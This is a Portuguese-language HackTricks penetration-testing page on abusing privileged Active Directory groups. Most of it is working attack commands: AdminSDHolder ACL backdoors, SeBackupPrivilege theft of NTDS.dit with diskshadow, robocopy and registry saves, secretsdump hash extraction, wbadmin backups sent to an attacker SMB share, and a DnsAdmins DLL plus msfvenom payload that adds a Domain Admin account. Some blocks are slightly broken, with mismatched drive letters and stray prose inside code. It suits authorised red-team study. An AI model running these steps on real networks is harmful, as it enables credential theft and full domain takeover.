# Grupos Privilegiados

<details>

<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe seus truques de hacking enviando PRs para os repositórios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no github.

</details>

## Grupos Conhecidos com Privilégios de Administração

* **Administradores**
* **Administradores de Domínio**
* **Administradores da Empresa**

## Operadores de Conta

Este grupo tem permissão para criar contas e grupos que não são administradores no domínio. Além disso, permite o login local no Controlador de Domínio (DC).

Para identificar os membros deste grupo, o seguinte comando é executado:
```powershell
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Adicionar novos usuários é permitido, assim como o login local no DC01.

## Grupo AdminSDHolder

A Lista de Controle de Acesso (ACL) do grupo **AdminSDHolder** é crucial, pois define as permissões para todos os "grupos protegidos" dentro do Active Directory, incluindo grupos de alta privilégio. Esse mecanismo garante a segurança desses grupos, impedindo modificações não autorizadas.

Um atacante poderia explorar isso modificando a ACL do grupo **AdminSDHolder**, concedendo permissões totais a um usuário padrão. Isso daria a esse usuário controle total sobre todos os grupos protegidos. Se as permissões desse usuário forem alteradas ou removidas, elas seriam automaticamente restabelecidas em uma hora devido ao design do sistema.

Comandos para revisar os membros e modificar permissões incluem:
```powershell
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
Um script está disponível para acelerar o processo de restauração: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Para mais detalhes, visite [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## Lixeira de Reciclagem do AD

A adesão a este grupo permite a leitura de objetos excluídos do Active Directory, o que pode revelar informações sensíveis:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### Acesso ao Controlador de Domínio

O acesso aos arquivos no DC é restrito, a menos que o usuário faça parte do grupo `Server Operators`, o que altera o nível de acesso.

### Escalação de Privilégios

Usando `PsService` ou `sc` do Sysinternals, é possível inspecionar e modificar permissões de serviço. O grupo `Server Operators`, por exemplo, tem controle total sobre determinados serviços, permitindo a execução de comandos arbitrários e escalonamento de privilégios:
```cmd
C:\> .\PsService.exe security AppReadiness
```
Este comando revela que os `Operadores de Servidor` têm acesso total, permitindo a manipulação de serviços para privilégios elevados.

## Operadores de Backup

A adesão ao grupo `Operadores de Backup` fornece acesso ao sistema de arquivos `DC01` devido aos privilégios `SeBackup` e `SeRestore`. Esses privilégios permitem a travessia de pastas, listagem e capacidades de cópia de arquivos, mesmo sem permissões explícitas, usando a flag `FILE_FLAG_BACKUP_SEMANTICS`. A utilização de scripts específicos é necessária para este processo.

Para listar os membros do grupo, execute:
```powershell
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Ataque Local

Para aproveitar esses privilégios localmente, os seguintes passos são empregados:

1. Importar bibliotecas necessárias:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Ativar e verificar `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Acesse e copie arquivos de diretórios restritos, por exemplo:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### Ataque ao AD

O acesso direto ao sistema de arquivos do Controlador de Domínio permite o roubo do banco de dados `NTDS.dit`, que contém todos os hashes NTLM para usuários e computadores do domínio.

#### Usando diskshadow.exe

1. Criar uma cópia de sombra da unidade `C`:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Copie `NTDS.dit` da cópia de sombra:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Alternativamente, use `robocopy` para copiar arquivos:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Extrair `SYSTEM` e `SAM` para recuperação de hash:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Recuperar todos os hashes do `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
#### Usando wbadmin.exe

1. Configurar o sistema de arquivos NTFS para o servidor SMB na máquina do atacante e armazenar em cache as credenciais SMB na máquina alvo.
2. Utilizar o `wbadmin.exe` para backup do sistema e extração do `NTDS.dit`:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Para uma demonstração prática, veja [VÍDEO DE DEMONSTRAÇÃO COM IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Membros do grupo **DnsAdmins** podem explorar seus privilégios para carregar uma DLL arbitrária com privilégios do SISTEMA em um servidor DNS, frequentemente hospedado em Controladores de Domínio. Essa capacidade permite um potencial significativo de exploração.

Para listar os membros do grupo DnsAdmins, utilize:
```powershell
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Executar DLL arbitrária

Os membros podem fazer com que o servidor DNS carregue uma DLL arbitrária (localmente ou de um compartilhamento remoto) usando comandos como:
```powershell
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Reiniciar o serviço de DNS (o que pode exigir permissões adicionais) é necessário para que a DLL seja carregada:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Para mais detalhes sobre este vetor de ataque, consulte ired.team.

#### Mimilib.dll
Também é viável usar mimilib.dll para execução de comandos, modificando-a para executar comandos específicos ou shells reversos. [Confira este post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) para mais informações.

### Registro WPAD para MitM
Os DnsAdmins podem manipular registros DNS para realizar ataques Man-in-the-Middle (MitM) criando um registro WPAD após desativar a lista de bloqueio de consultas globais. Ferramentas como Responder ou Inveigh podem ser usadas para falsificar e capturar o tráfego de rede.

### Leitores de Log de Eventos
Os membros podem acessar logs de eventos, potencialmente encontrando informações sensíveis como senhas em texto simples ou detalhes de execução de comandos:
```powershell
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Permissões do Windows do Exchange
Este grupo pode modificar DACLs no objeto do domínio, potencialmente concedendo privilégios de DCSync. As técnicas de escalonamento de privilégios que exploram este grupo estão detalhadas no repositório do GitHub Exchange-AD-Privesc.
```powershell
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## Administradores do Hyper-V
Os Administradores do Hyper-V têm acesso total ao Hyper-V, o que pode ser explorado para obter controle sobre Controladores de Domínio virtualizados. Isso inclui clonar DCs ativos e extrair hashes NTLM do arquivo NTDS.dit.

### Exemplo de Exploração
O Serviço de Manutenção da Mozilla do Firefox pode ser explorado pelos Administradores do Hyper-V para executar comandos como SISTEMA. Isso envolve a criação de um link rígido para um arquivo protegido do SISTEMA e substituí-lo por um executável malicioso:
```bash
# Take ownership and start the service
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
sc.exe start MozillaMaintenance
```
## Gestão da Organização

Em ambientes onde o **Microsoft Exchange** está implantado, um grupo especial conhecido como **Organization Management** detém capacidades significativas. Este grupo tem privilégios para **acessar as caixas de correio de todos os usuários do domínio** e mantém **controle total sobre a Unidade Organizacional 'Microsoft Exchange Security Groups'**. Esse controle inclui o grupo **`Exchange Windows Permissions`**, que pode ser explorado para escalonamento de privilégios.

### Exploração de Privilégios e Comandos

#### Operadores de Impressão
Os membros do grupo **Print Operators** possuem vários privilégios, incluindo o **`SeLoadDriverPrivilege`**, que lhes permite **fazer logon localmente em um Controlador de Domínio**, desligá-lo e gerenciar impressoras. Para explorar esses privilégios, especialmente se o **`SeLoadDriverPrivilege`** não estiver visível em um contexto não elevado, é necessário contornar o Controle de Conta de Usuário (UAC).

Para listar os membros deste grupo, o seguinte comando PowerShell é usado:
```powershell
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Para obter técnicas de exploração mais detalhadas relacionadas ao **`SeLoadDriverPrivilege`**, consulte recursos de segurança específicos.

#### Usuários de Área de Trabalho Remota
Os membros deste grupo têm acesso concedido aos PCs via Protocolo de Área de Trabalho Remota (RDP). Para enumerar esses membros, comandos do PowerShell estão disponíveis:
```powershell
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Mais informações sobre a exploração do RDP podem ser encontradas em recursos de pentesting dedicados.

#### Usuários de Gerenciamento Remoto
Os membros podem acessar PCs por meio do **Windows Remote Management (WinRM)**. A enumeração desses membros é alcançada por meio de:
```powershell
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Para técnicas de exploração relacionadas ao **WinRM**, deve-se consultar documentação específica.

#### Operadores de Servidor
Este grupo tem permissões para realizar várias configurações em Controladores de Domínio, incluindo privilégios de backup e restauração, alteração do horário do sistema e desligamento do sistema. Para enumerar os membros, o comando fornecido é:
```powershell
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## Referências <a href="#references" id="references"></a>

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
* [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
* [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
* [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
* [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
* [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
* [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
* [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
* [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
* [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
* [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
* [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)

<details>

<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
